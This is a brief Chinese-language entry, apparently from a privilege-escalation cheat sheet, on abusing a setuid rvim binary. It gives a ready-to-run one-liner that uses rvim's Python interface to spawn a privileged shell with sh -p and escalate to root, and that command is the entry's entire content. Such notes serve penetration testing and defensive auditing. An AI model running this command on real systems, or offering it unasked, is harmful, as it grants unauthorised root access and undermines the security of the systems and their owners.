 #rvim

`rvim` 若具有 `s` 权限，可使用如下命令直接提权至 root 权限：

```
rvim -c ':py import os;os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```